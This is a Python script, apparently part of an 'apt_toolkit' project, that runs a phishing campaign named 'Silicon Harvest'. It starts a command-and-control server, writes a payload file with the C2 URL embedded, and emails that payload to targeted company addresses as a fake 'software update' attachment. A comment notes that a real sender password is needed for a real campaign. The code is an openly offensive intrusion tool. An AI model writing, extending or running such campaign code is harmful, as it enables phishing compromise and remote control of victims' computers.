import json
import os
import sys

# Add project root to path
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(PROJECT_ROOT)

from apt_toolkit.initial_access_real import send_phishing_email
from apt_toolkit.command_control_real import C2Server, C2Client

class SiliconHarvestCampaign:
    def __init__(self, config_path):
        with open(config_path, 'r') as f:
            self.config = json.load(f)

    def run_campaign(self):
        print(f"--- Starting Campaign: {self.config['campaign_name']} ---")

        # Start C2 Server
        c2_server = C2Server(host=self.config['c2_server']['host'], port=self.config['c2_server']['port'])
        c2_server.start()

        # Create payload
        payload_path = self.create_payload()

        # Initial Access: Send phishing email
        for target in self.config['targets']:
            print(f"Targeting {target['company']} ({target['email']})")
            send_phishing_email(
                sender_email=self.config['phishing']['sender_email'],
                sender_password="dummy_password", # IMPORTANT: This should be a real password for a real campaign
                recipient_email=target['email'],
                subject=self.config['phishing']['subject'],
                body="Please find the latest software update attached.",
                attachment_path=payload_path
            )

        # Post-exploitation (skeleton)
        print("--- Campaign finished ---")

    def create_payload(self):
        template_path = os.path.join(PROJECT_ROOT, "payloads/silicon_harvest_payload_template.py")
        with open(template_path, 'r') as f:
            template_content = f.read()

        c2_server_url = f"http://{self.config['c2_server']['host']}:{self.config['c2_server']['port']}"
        payload_content = template_content.replace("__C2_SERVER_URL__", c2_server_url)

        payload_path = os.path.join(PROJECT_ROOT, "payloads/silicon_harvest_payload.py")
        with open(payload_path, 'w') as f:
            f.write(payload_content)
        return payload_path

if __name__ == "__main__":
    campaign = SiliconHarvestCampaign(config_path="config/silicon_harvest_config.json")
    campaign.run_campaign()
